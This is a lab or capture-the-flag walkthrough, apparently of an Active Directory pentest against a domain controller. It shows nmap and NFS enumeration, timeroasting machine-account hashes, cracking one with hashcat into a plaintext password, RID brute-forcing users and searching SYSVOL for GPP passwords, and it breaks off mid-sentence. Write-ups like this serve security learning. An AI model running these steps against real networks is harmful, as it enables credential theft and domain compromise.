
# Objective and scope
You have been hired to perform an internal penetration test against the client's Active Directory environment. There is only one host in-scope (the Domain Controller). Your task is to get initial access and then perform lateral movement and privilege escalation until you have fully compromised the domain.

The client has provided you with VPN access to their environment, but no other information

# Host file setup
```python
sudo nxc smb 10.0.29.162 --generate-hosts-file /etc/hosts 
[sudo] password for kali: 
SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## Open ports
```python
nmap -p- --min-rate=1000 -sT dc01.fragments.local                                                            
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 16:42 +0100
Nmap scan report for dc01.fragments.local (10.0.29.162)
Host is up (0.097s latency).
rDNS record for 10.0.29.162: DC01.fragments.local
Not shown: 65521 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2049/tcp  open  nfs
3389/tcp  open  ms-wbt-server
49684/tcp open  unknown
49688/tcp open  unknown
49719/tcp open  unknown
49753/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 131.83 seconds
```

Port 88, 389 and 5985 are also open
## Nmap
```python
nmap -p 53,88,111,135,139,389,445,464,593,636,2049,3389,5985 -A --min-rate=1000 -sT dc01.fragments.local  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 16:46 +0100
Nmap scan report for dc01.fragments.local (10.0.29.162)
Host is up (0.098s latency).
rDNS record for 10.0.29.162: DC01.fragments.local

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-03 15:46:42Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fragments.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3389/tcp open  ms-wbt-server
| ssl-cert: Subject: commonName=DC01.fragments.local
| Not valid before: 2026-07-13T01:02:46
|_Not valid after:  2027-01-12T01:02:46
| rdp-ntlm-info: 
|   Target_Name: FRAGMENTS
|   NetBIOS_Domain_Name: FRAGMENTS
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: fragments.local
|   DNS_Computer_Name: DC01.fragments.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-03T15:47:36+00:00
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.99%I=7%D=8/3%Time=6A70B7E7%P=x86_64-pc-linux-gnu%r(Ter
SF:minalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\0
SF:\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)
Null auth enabled, cant use it to access shares or list users

Guest account is also disabled

# NFS (2049)
## Shares
```python
nxc nfs dc01.fragments.local --shares
NFS         10.0.29.162     2049   dc01.fragments.local [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.0.29.162     2049   dc01.fragments.local [*] Enumerating NFS Shares
NFS         10.0.29.162     2049   dc01.fragments.local UID        Perms    Storage Usage    Share                          Access List    
NFS         10.0.29.162     2049   dc01.fragments.local ---        -----    -------------    -----                          -----------    
NFS         10.0.29.162     2049   dc01.fragments.local 4294967294 r--      36.3GB/49.9GB    /incidents                     Everyone 
```

There is no root escape!

```python
nxc nfs dc01.fragments.local --share '/incidents' --ls '/'
NFS         10.0.29.162     2049   dc01.fragments.local [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.0.29.162     2049   dc01.fragments.local UID        Perms  File Size     File Path
NFS         10.0.29.162     2049   dc01.fragments.local ---        -----  ---------     ---------
NFS         10.0.29.162     2049   dc01.fragments.local 4294967294 dr--   64.0B         /incidents/.
NFS         10.0.29.162     2049   dc01.fragments.local 4294967294 dr--   64.0B         /incidents/..
NFS         10.0.29.162     2049   dc01.fragments.local 4294967294 -r-x   647.0B        /incidents/IR_20260122_ACC.log
NFS         10.0.29.162     2049   dc01.fragments.local 4294967294 -r-x   1.3KB         /incidents/IR_20260202_FRG0310.log
```

## Downloading files from share
```python
nxc nfs dc01.fragments.local --share '/incidents' --get-file IR_20260122_ACC.log IR_20260122_ACC.log
NFS         10.0.29.162     2049   dc01.fragments.local [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.0.29.162     2049   dc01.fragments.local [*] Downloading IR_20260122_ACC.log to IR_20260122_ACC.log
NFS         10.0.29.162     2049   dc01.fragments.local File successfully downloaded from IR_20260122_ACC.log to IR_20260122_ACC.log

nxc nfs dc01.fragments.local --share '/incidents' --get-file IR_20260202_FRG0310.log IR_20260202_FRG0310.log
NFS         10.0.29.162     2049   dc01.fragments.local [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.0.29.162     2049   dc01.fragments.local [*] Downloading IR_20260202_FRG0310.log to IR_20260202_FRG0310.log
NFS         10.0.29.162     2049   dc01.fragments.local File successfully downloaded from IR_20260202_FRG0310.log to IR_20260202_FRG0310.log
```

```python
cat IR_20260122_ACC.log 
==================================================
INCIDENT RESPONSE LOG - INTERNAL USE ONLY
==================================================
File: IR_20260122_ACC.log
Created: 2026-01-22 10:15:21 EST
Last Modified: 2026-01-22 10:15:21 EST
Case ID: IR-2026-0122
User: Administrator
Status: Under Investigation
Severity: MEDIUM (5.1/10)
==================================================

== INCIDENT SUMMARY ==
While updating a user account, I may have messed up one of the account attributes and now the account doesn't work.

== TIMELINE ==
2026-01-22: Under Investigation...
==================================================
```

```python
cat IR_20260202_FRG0310.log 
==================================================
INCIDENT RESPONSE LOG - INTERNAL USE ONLY
==================================================
File: IR_20260202_FRG0310.log
Created: 2026-02-02 09:14:22 EST
Last Modified: 2026-02-02 11:30:47 EST
Case ID: IR-2026-0022
System: FRG0310.fragments.local
User: Administrator
Agent: Built-in Windows Defender
Status: Under Investigation
Severity: MEDIUM (5.8/10)
Threat ID: DEFENDER-ALERT-7721
==================================================

== INCIDENT SUMMARY ==
Security alert triggered on workstation FRG0310 (Windows 11 Pro).
Detection: Unusual PowerShell script execution patterns.
Activity: Multiple failed authentication attempts from user session.
Impact: Local credential caching anomalies detected.
No external network communications observed.

== TIMELINE ==
2026-02-02 08:45:10 - Initial alert: PowerShell execution anomaly
2026-02-02 09:00:33 - Failed logon attempts from existing session
2026-02-02 09:14:22 - Investigation initiated
2026-02-02 10:15:00 - System isolated for analysis

== RECOMMENDED ACTIONS ==
1. Review authentication logs
2. Check for local privilege escalation
3. Reset local Administrator account
4. Scan for persistence mechanisms
==================================================
```

I also cannot upload to the share!

Looks like there is a machine account `FRG0310$`

# TimeRoasting

```python
nxc smb dc01.fragments.local -u '' -p '' -M timeroast --smb-timeout 5 
SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.29.162     445    DC01             [+] fragments.local\: 
TIMEROAST   10.0.29.162     445    DC01             [*] Starting Timeroasting...
TIMEROAST   10.0.29.162     445    DC01             1000:$sntp-ms$e68346c899760c793adf42f2951095c9$1c0111e900000000000a08434c4f434cee1b34d96467d92de1b8428bffbfcd0aee1b3fbea09095e4ee1b3fbea090f22b
TIMEROAST   10.0.29.162     445    DC01             1105:$sntp-ms$78276a9558e9c4bb2159c199767b7416$1c0111e900000000000a08444c4f434cee1b34d96367df0ce1b8428bffbfcd0aee1b3fbf4367a601ee1b3fbf436808fd
TIMEROAST   10.0.29.162     445    DC01             1103:$sntp-ms$53f13f15a697cb399576d35a20bd875a$1c0111e900000000000a08444c4f434cee1b34d9645c5062e1b8428bffbfcd0aee1b3fbf4085172bee1b3fbf40856cbb
```

Ill place these hashes into a text file!

```python
hashcat -m 31300 timeroast.hash /usr/share/wordlists/rockyou.txt

$sntp-ms$53f13f15a697cb399576d35a20bd875a$1c0111e900000000000a08444c4f434cee1b34d9645c5062e1b8428bffbfcd0aee1b3fbf4085172bee1b3fbf40856cbb:supercalifradualisticexpialidoutious
```

Found a password

```python
supercalifradualisticexpialidoutious
```

Since i dont have a user list ill have to just try this against the machine account i found

# Enumeration using `FRG0310$`

```python
nxc smb dc01.fragments.local -u 'FRG0310$' -p 'supercalifradualisticexpialidoutious' --smb-timeout 5
SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.29.162     445    DC01             [+] fragments.local\FRG0310$:supercalifradualisticexpialidoutious
```

This machine account is now compromised!

## SMB Shares
```python
nxc smb dc01.fragments.local -u 'FRG0310$' -p 'supercalifradualisticexpialidoutious' --shares --smb-timeout 5
SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.29.162     445    DC01             [+] fragments.local\FRG0310$:supercalifradualisticexpialidoutious 
SMB         10.0.29.162     445    DC01             [*] Enumerated shares
SMB         10.0.29.162     445    DC01             Share           Permissions     Remark
SMB         10.0.29.162     445    DC01             -----           -----------     ------
SMB         10.0.29.162     445    DC01             ADMIN$                          Remote Admin
SMB         10.0.29.162     445    DC01             C$                              Default share
SMB         10.0.29.162     445    DC01             IPC$            READ            Remote IPC
SMB         10.0.29.162     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.0.29.162     445    DC01             SYSVOL          READ            Logon server share
```

Just the default SMB shares!

## Dumping users 
```python
nxc smb dc01.fragments.local -u 'FRG0310$' -p 'supercalifradualisticexpialidoutious' --rid-brute 20000 --smb-timeout 5 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC01$
FRG0310$
PROD$
o.rodrigo
j.woods
d.goggins
c.white
sharedadmin
```

Ill dump them all to a user file!

No kerberoastable accounts

# GPP password
```python
nxc smb dc01.fragments.local -u 'FRG0310$' -p 'supercalifradualisticexpialidoutious' --smb-timeout 5 -M gpp_password
SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.29.162     445    DC01             [+] fragments.local\FRG0310$:supercalifradualisticexpialidoutious 
SMB         10.0.29.162     445    DC01             [*] Enumerated shares
SMB         10.0.29.162     445    DC01             Share           Permissions     Remark
SMB         10.0.29.162     445    DC01             -----           -----------     ------
SMB         10.0.29.162     445    DC01             ADMIN$                          Remote Admin
SMB         10.0.29.162     445    DC01             C$                              Default share
SMB         10.0.29.162     445    DC01             IPC$            READ            Remote IPC
SMB         10.0.29.162     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.0.29.162     445    DC01             SYSVOL          READ            Logon server share 
GPP_PASS... 10.0.29.162     445    DC01             [+] Found SYSVOL share
GPP_PASS... 10.0.29.162     445    DC01             [*] Searching for potential XML files containing passwords
GPP_PASS... 10.0.29.162     445    DC01             [*] Found fragments.local/Policies/{EDFFE4E4-762D-47E5-85E7-B52950A90149}/Machine/Preferences/Groups/Groups.xml
```

So after trying loads of different things even doing this exact thing but using the impacke